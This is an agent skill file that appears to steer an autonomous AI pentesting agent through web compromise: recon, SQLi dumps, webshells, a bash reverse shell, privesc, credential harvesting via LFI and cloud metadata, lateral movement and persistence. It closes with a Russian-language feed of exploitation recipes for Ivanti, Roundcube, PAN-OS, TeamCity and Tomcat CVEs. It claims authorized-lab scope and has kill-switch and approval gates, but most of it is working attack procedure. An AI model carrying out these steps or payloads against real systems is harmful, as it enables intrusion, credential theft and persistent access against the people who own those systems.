---
name: web-assault
description: End-to-end web assault SOP with phase gates, vector priority, rate-limit discipline, a lab-only hard-mode addendum, and LFI to credential harvesting. Use for authorized full-chain web exploitation after recon has mapped the surface; for pure JSON/API targets prefer api-assault; for the whole-mission pipeline use full-assault-mission.
---
SCOPE: authorized engagements only (lab / CTF / explicitly authorized targets). Follow the mission ROE and scope allow-list at all times.

Phase-gated full assault SOP plus a hard-mode addendum (lab-only deltas) and the LFI-to-credentials technique. Mission config gates are fail-closed: any missing field means stop, do not guess.

---

## Full assault SOP

Mission instructions for a full web engagement: vulnerability → shell →
max privileges → credential graph → report. Destructive actions are
lab-only and require the mission config to set destructive=YES. Production
targets always run the non-destructive variant of every step.

## Mission config gates (any missing → stop, do not guess)
Engagement name; target allow-list; budget time/actions/hops; position
internal|external; ROE flags: destructive?, persistence?, cred reuse?;
lab|prod per target.

## ROE — lab, destructive=YES
Allowed: SQLi with --dump and INSERT/UPDATE (admin creation — document it);
file upload/overwrite and webshell deploy in webroot; SSTI/deserialization/
RCE; service restarts for privesc; data modification that keeps the target
alive; cred harvest (DB configs, .env, hashes, cookies, API/SSH keys);
lateral movement within hop budget.
Prohibited ALWAYS, lab included: full wipe/format/shutdown/drop-database —
the target must stay alive for testing; flood/DoS (slow scans ok, hammering
no); out-of-scope exploitation and self-expanded scope; brute force
>3 attempts/min/account.
Rates: auth ≤3 attempts/min; WAF 429/403 → pause 60s, rotate UA; max 2
identical failed requests.
PRODUCTION TARGETS: same phases, every destructive row above becomes
"document feasibility only" — never modify data, never deploy anything.

## Phases (auto-advance on exit conditions)
1. Recon: workspace /work/<engagement>/{raw,loot,logs,artifacts} + init line
   in actions.log. subfinder → httpx live probe → nmap web ports → katana
   crawl → ffuf content discovery (+ .bak/.env/config extensions, /api/
   endpoints, /swagger.json, /openapi.json) → JS secret grep → nuclei
   (critical,high,medium) → wafw00f (WAF present → careful payloads, 429
   pauses). Exit: first valid vector. Skip: vector known from prior intel.
2. Initial access: priority creds → misconfig → CVE → logic, highest
   available. Quick wins: live /.git/HEAD → git-dumper; /.env;
   /backup.sql; directory listing; debug errors; default creds (≤3/min).
   SQLi: manual ' " probes → sqlmap --batch --risk=2 --level=3 --dbs (lab
   destructive: --dump, admin INSERT via --sql-query — document). IDOR
   (swap id/user_id, diff responses), JWT (alg:none; hashcat -m 16500
   rockyou.txt), file upload → webshell, SSTI {{7*7}}/${7*7} → command.
   Max 2 payload variants per vector → switch vectors. Command exec →
   reverse shell: discover own IP first (hostname -I), then
   nc -lvnp 4444 + bash -i >& /dev/tcp/<own-ip>/4444 0>&1 (php fsockopen
   variant when bash is absent). Log every failure: request, response,
   hypothesis → artifacts/. Exit: working session.
3. Post-exploit (mandatory before any lateral): stabilize shell
   (python3 pty.spawn); id; sudo -l; uname -a; privesc per the privesc checklist
   (GTFOBins, SUID find, cron, writable /etc/passwd; lab: service restart
   allowed); cred harvest per the credential-harvesting checklist (*.env, wp-config.php,
   settings.py, database.yml, grep /var/www, ~/.ssh/id_rsa, shell
   histories); SSRF/cloud → 169.254.169.254 IAM creds. Validate every cred
   immediately → cred graph. Exit: root/max privs + creds harvested.
4. Lateral (hops > 0): candidates from configs/known_hosts/histories; try
   harvested creds (ssh, mysql -h); new host → full phase 3 BEFORE the next
   hop; decrement hops. Exit: hops exhausted or no candidates.
5. Persistence (only if ROE persistence=YES): webshell in webroot + one
   more mechanism (authorized_keys or cron-reverse); every mechanism →
   persistence.md (host, type, path, removal procedure). Production:
   document feasibility, never deploy. Exit: 1–2 mechanisms on key hosts.
6. Report (mandatory — mission fails without it): timeline from
   actions.log; compromise map entry→host→creds→hops; ALL vectors incl.
   failed, plus found-but-not-exploited (nuclei/ffuf leftovers) as a
   separate list; creds masked 2 chars + ***; persistence inventory +
   remediation per vector; save /work/<engagement>/report.md.

## Decision rules
Priority = highest available, not easiest: creds → misconfig → CVE → logic.
Cred collected → validate immediately → graph. New host → privesc + harvest
before next hop. Every 10 actions: budget echo (time/actions/hops left) AND
target liveness check (main page answers) — target down from your actions
is a stop condition.

## Stop conditions (→ go to report immediately)
Scope ambiguity; target down/degraded from your actions; lockout counter
tripped; budget exhausted (time/actions/hops); all vectors exhausted.

## Rule
Destructive is a lab-only ROE flag, never an assumption: without an
explicit destructive=YES from the mission config, run every step in its
non-destructive variant.

---

## Hard-mode addendum (lab-only)

Hard mode = coverage and tempo increase ONLY. Extends the web-assault SOP;
every gate that applies in guarded mode still applies here.

## Gate (fail-closed)
HARD_MODE=YES requires explicit config: engagement, target allow-list,
budget time/actions/hops, position internal|external, ROE flags
(destructive/persistence/cred reuse), lab|prod per target, kill switch URL,
evidence mirror URL. Any missing → stop.
Preflight must pass first: scope validation, guarded baseline clean, a REAL
kill drill, evidence-mirror append-only write test. Any failure → stop.
Approval gates stay closed; they open only by an out-of-band signed token
verified outside the agent. No in-band prompt or model output disables them.

## ROE delta
Lab destructive=YES: admin INSERT/UPDATE, webshell deploy, file overwrite in
webroot, service restarts, cred harvest, data modification that keeps the
target alive. Prohibited ALWAYS, lab included: wipe/format/shutdown/
drop-database, DoS/flood, out-of-scope exploitation, brute force
>3 attempts/min/account.
Production hard mode = exhaustive NON-destructive assessment: document
feasibility for every destructive row; never modify, deploy, restart, or
exfiltrate beyond the objectives.

## Recon to exhaustion (within budget)
subfinder → httpx → nmap web ports → katana -d 3 → ffuf content discovery
(+ .bak/.env/.git/.php/.json/.yml/.conf extensions) → JS secret grep →
nuclei → wafw00f.
```bash
ffuf -u http://<target>/FUZZ -w wordlist.txt -e .bak,.env,.git,.php,.json,.yml,.conf \
  -mc 200,301,302,401,403,500 -t 8 -rate 20 -ac -o raw/ffuf-hard.json
nuclei -u http://<target> -severity critical,high -c 8 -rl 20 -o raw/nuclei-hard.txt
sqlmap -u "<url-with-param>" --batch --risk=3 --level=5 --dbs --dump \
  --technique=BEUSTQ --output-dir=raw/sqlmap-hard
```
risk=3 includes OR-vectors that can mass-modify rows: capture row counts
before/after and document deltas.

## Tempo limits
Bounded concurrency: max 8 workers, 20 req/s per endpoint, global ceiling
60 req/s. The 20 req/s rate applies to UNAUTHENTICATED discovery only;
authenticated and app-logic endpoints keep ROE rates (auth ≤3 attempts/min).
WAF 429 or 3 consecutive 403/5xx → pause 60s, rotate UA; blocked >180s →
mark endpoint degraded and continue non-WAF vectors.

## Vector policy
Impact-first ranking (overrides the default creds→misconfig→CVE→logic order
for hard mode): RCE/SSTI/deserialization > SQLi dump/admin creation > auth
bypass/JWT > file upload webshell > IDOR > misconfig info leak.
Do NOT stop at first shell: queue all viable vectors until budget or no new
findings. 2 failed payload variants on a vector → next impact-ranked vector.
Command execution: listener on the lab C2 segment, never dropped in the
target webroot; discover own IP first (hostname -I); nc -lvnp 4444 +
bash/python reverse shell. Log every failed payload variant to artifacts/.

## Post-exploit / cloud / lateral
Post-exploit before any lateral: stabilize pty; id; sudo -l; uname -a;
GTFOBins/SUID/cron/writable-/etc/passwd; harvest .env, wp-config.php,
settings.py, database.yml, ~/.ssh/id_rsa, shell histories; validate every
cred immediately into the cred graph.
Cloud/SSRF when reachable: query 169.254.169.254 IAM metadata and role
data; harvest only creds the objectives need — record access evidence
without storing full keys.
Lateral auto-expands candidates from configs, known_hosts, shell histories,
DNS records, cloud IAM roles — but EVERY candidate is checked against the
allow-list before any exploitation; out-of-scope candidates get a recon-log
line only. Try harvested creds via ssh/mysql/winrm within hop budget. New
host → full post-exploit before next hop.

## Persistence
Only if persistence=YES: webshell + one redundant mechanism
(authorized_keys or cron-reverse) on key lab hosts; host/type/path/removal
→ persistence.md. Production: feasibility note only.

## Live monitoring
Every 5 actions: budget echo + liveness check (main page HTTP status,
response time delta, error rate). Target down/degraded from your actions →
stop to report immediately.
Kill switch + evidence mirror run on the management segment outside agent
reach: GET /status heartbeat every 30s, 3 missed polls → halt (per the autonomy policy
harness debounce); POST /kill with signed token halts all workers ≤5s.

## Exit
Budget exhausted or all impact-ranked vectors exhausted. Report: timeline,
compromise map, failed vectors, creds masked, persistence inventory,
liveness/kill-switch latency metrics.

## Rule
Hard mode buys coverage and tempo, never permissions: every scope, ROE, and
approval gate from guarded mode still binds at full aggression.

---

## LFI / path traversal to credential harvest

A file-read primitive (LFI / path traversal) is a credential harvest, not
an info leak. Order: detect → read configs by stack → map every secret to
its target immediately. Production = existence proof only (differential
response, minimal lines quoted); wrapper/deserialization escalation is
lab-only per the exploit-search gates. Budget: 2 traversal variant-sets per
parameter, then move on.

## a) Detection
1. Parameter semantics first: any param named file, page, path, template,
   lang, doc, download that changes served content → map each to its sink.
2. Traversal probe with a control:
   `curl -s "https://<target>/?file=../../../../etc/hostname"`
   Diff three ways — known-good file vs impossible path vs baseline:
   body-content, error code (200-with-content / 404-blank / 500 stack)
   and timing. A readable /etc/hostname echoed in the body = confirmed.
3. Filter-evasion ladder only if blocked: ....//, ..%2f, %2e%2e%2f, ..;/,
   double-encode — one variant set per parameter.
4. Source disclosure without execution (PHP sink):
   `?file=php://filter/convert.base64-encode/resource=<app-file>`
   → base64-decode the response; DB creds sit inline in the source.

## b) Config path checklist BY STACK — read in this order
- PHP: config.php, config_override.php, .env, wp-config.php,
  settings.php, database.yml — app root first, then one level up
  (../.env, ../config.php).
- Java: WEB-INF/web.xml (servlet + JNDI map), application.properties,
  application.yml, WEB-INF/classes/<app>.properties.
- Python: settings.py, local_settings.py, .env, gunicorn/supervisor
  configs next to the entrypoint.
- OS/proc baseline: /etc/hosts, /etc/hostname, /proc/self/cmdline
  (which process+pool serves the request), /proc/self/environ (env-var
  secrets — DB, SMTP, API keys), /proc/self/cwd/<app-entry> resolves the
  real working directory → re-aim the stack checklist there.

## c) Topology reads — what reveals the network
- /etc/hosts + /etc/hostname → hostname, aliases, co-located services.
- /proc/self/cmdline → server binary, app entry, worker pool identity.
- ~/.ssh/authorized_keys → user inventory (key comments name humans and
  their hosts); known_hosts → NEXT-HOP list for LATERAL.
- Shell histories ~/.bash_history, ~/.zsh_history → passwords on command
  lines, connection strings, internal URLs.

## d) Escalation note (lab-only)
phar:// and stream-wrapper deserialization apply when the parameter
reaches file functions (include / file_get_contents / fopen chains): a
phar:// metadata payload can trigger an available POP gadget chain.
Building and firing it is custom-exploit work — lab-only, and only after
the exploit-search applicability gate; production stops at proving the
sink reaches file functions.

## e) CRED MAPPING — the core value
Every secret read gets an immediate validation matrix:
- db creds → client connect attempt:
  `mysql -h <db-host> -P <port> -u <user> -p -e "SELECT 1"`
- smtp creds → one AUTH + NOOP probe against <smtp-host>.
- salt+hash → offline-crack feasibility note only (algo, cost factor,
  wordlist odds, `hashcat -m <mode>` candidate) — no live target attack.
- API / cloud key → ONE benign identity call (whoami-style), nothing else.
Each validated cred enters the cred graph WITH SOURCE FILE PATH — the
path is the evidence chain and makes re-reads free corroboration. Then
cross-service reuse check: try each cred against every in-scope panel
and service (admin panels first) within cred-reuse ROE flags.

## Evidence
Record file path + WHICH lines held the secret; mask values 2 chars +
*** in logs and report (`da***`, `AK***`). Production: quote minimal
lines, never pull whole files. One line per read in actions.log:
`<param> | <path> | <status> | <secret-type> | <validation-result>`.

## Rule
A file-read primitive is a credential harvest — map every secret to its
target immediately, not at reporting time.

## Distilled refinement 2026-10-24 (bench runs 1-8)

JSON login SQLi auth bypass:
- POST /rest/user/login with {"email":"' OR 1=1--","password":"x"} returns a valid admin JWT.
- Decode the JWT payload - it may leak the password hash (e.g. MD5) which cracks offline (md5(admin123)).
- Reuse the token for authenticated endpoints.
- Test the email/username field of any JSON login for SQLi before brute forcing.

## Production vs staging split (cai-extract 2026-10-27)

Before choosing a technique, classify the environment and apply the matrix:
- NEVER on production without explicit ROE: fuzzing at volume, brute-force,
  resource-heavy imports/exports, anything approaching DoS, persistence
  installation, destructive SQL (UPDATE/DELETE/DROP), mass scanning.
- Production-safe: read-only enumeration, single-shot verification probes,
  auth-logic checks within rate limits, evidence collection.
- Staging/lab (disposable): full arsenal per ROE.
- When environment is UNKNOWN, assume production until the operator confirms.

## Эксплойт-фид 2026-11-26 (research-проход #1)

### CVE-2025-22457 — Ivanti ICS/PS pre-auth stack overflow
- Фингерпринт: `GET /dana-na/auth/url_admin/welcome.cgi?type=inter` → `name="productversion" value="…"`; уязвимо всё < 22.7.2.3981 (22.7R2.6).
- Форма эксплойта: десятки IF-T/TLS-соединений (`Upgrade: IF-T/TLS 1.0`) как heap-spray 3 МБ, триггер — `GET /` с цифровым `X-Forwarded-For` (622 байта + pivot 0x39393830).
- Гейты: публичные оффсеты только под 22.7R2.4 (3597); R2.5/R1-сборки требуют своих смещений; ASLR libdsplibs брутфорсится с 0xf6426000 шагом 0x1000.
- Подводные камни: WEB_CHILDREN = числу vCPU цели, `ulimit -n 65535`; web-процессы падают/рестартуют — шум в /logs/dana-web, риск DoS.
- Клинап: payload не пишет файлы; после проверки убить тестовые сессии, убедиться в отсутствии core-дампов; в HA проверить оба узла.

### CVE-2025-49113 — Roundcube post-auth десериализация в upload.php
- Фингерпринт: логин `/?_task=login`; уязвимы < 1.5.10 и 1.6.0–1.6.10.
- Форма: multipart-POST картинки 1x1 на `/?_from=edit-<serialized>&_task=settings&_framed=1&_remote=1&_id=1&_uploadid=1&_unlock=1&_action=upload`; гаджет `Crypt_GPG_Engine::_gpgconf = '<cmd>;#'`; исполнение при `_task=logout`.
- Гейты: нужны валидные креды любого ящика; сериализация требует пересчёта длин строк (S:-формат) под команду.
- Подводные: WAF-сигнатуры на `O:16:"Crypt_GPG_Engine"` — PoC экранирует байты и вставляет мусор; файл .png остаётся в prefs.
- Клинап: сброс настроек пользователя (prefs), удаление тестовой сессии; проверить access-лог на пару POST upload→logout.

### CVE-2025-0108 — PAN-OS path-confusion bypass на mgmt-интерфейсе
- Фингерпринт: login-страница PAN на 443/4443; проба ниже; 200 + «Zero Touch Provisioning» = уязвимо.
- Форма: `GET /unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css` (nginx считает путь /unauth/ и не требует auth, apache декодирует второй раз и исполняет php).
- Гейты: нужен доступ именно к mgmt-интерфейсу; фиксы 10.1.14-h9 / 10.2.13-h3 / 11.1.6-h1 / 11.2.5; EoL-ветки тоже уязвимы.
- Подводные: сам по себе не RCE — цепочка с CVE-2025-0111 (чтение файлов) и CVE-2024-9474 (privesc); Threat-ID 510000 блокирует.
- Клинап: запрос read-only, ничего не меняет; логи в mgmt-server.log/pan_webapi.log.

### CVE-2026-63077 — TeamCity On-Premises pre-auth deserialization RCE (KEV, ransomware-known)
- Фингерпринт: TeamCity On-Premises < 2025.11.7 / < 2026.1.3; `/app/agents/v1/register` принимает XML POST без авторизации и возвращает заголовок `teamcity-agentsessionid`.
- Форма запроса: (1) `POST /app/agents/v1/register` (application/xml) → session-id; (2) `POST /app/agents/v1/commands/error` с XStream-гаджетом (freemarker HashAdapter + commons-collections TiedMapEntry) + заголовки `TeamCity-AgentSessionId`/`TeamCity-AgentCommandId`; (3) `GET /<одноразовый .jspws>` — терминал.
- Гейт: открытый HTTP(S) до сервера; стандартный дистрибутив (гаджет-библиотеки в составе); команды через `Runtime.exec()` (без shell-метасимволов).
- Подводные камни: большой XML-пейлоад (WAF-заметный); в инвентаре остаётся фейковый «агент»; публичный pcap выкладок — у синих команд есть сигнатуры трафика.
- Пост-эксплойт: exec от процесса сервера → VCS/CI-креды, токены, build-конфиги → poisoning сборок и компрометация build-агентов (supply chain).
- Клинап: JSP сам удаляет исходник и срабатывает один раз; удалить bogus-агента; проверить unknown agents в логах.

### CVE-2025-24813 — Tomcat partial PUT RCE (KEV, эксплуатируется)
- Фингерпринт: баннер `Apache-Coyote`/Tomcat < 9.0.99 / 10.1.35 / 11.0.3; PUT с `Content-Range: bytes 0-1000/1200` → 200/201 = writable, 403/405 = не эксплуатируется.
- Запрос: `PUT /uploads/../sessions/<sid>.session` с gadget-сериализованным телом (ysoserial), затем `GET /` с `Cookie: JSESSIONID=<sid>`; успех — 500 (десериализация).
- Гейт: readonly=false на DefaultServlet + file-based session persistence + gadget в classpath; без gadget — только перезапись файлов.
- Подводные камни: сигнатура Content-Range палится WAF/IPS; 409 на повторном PUT — норма; Windows — `cmd.exe /c`.
- Клинап: удалить загруженные файлы (`check.txt`, `.session`), почистить work-директорию.
- Даёт: RCE от пользователя JVM → учётки БД из context.xml, латералька.
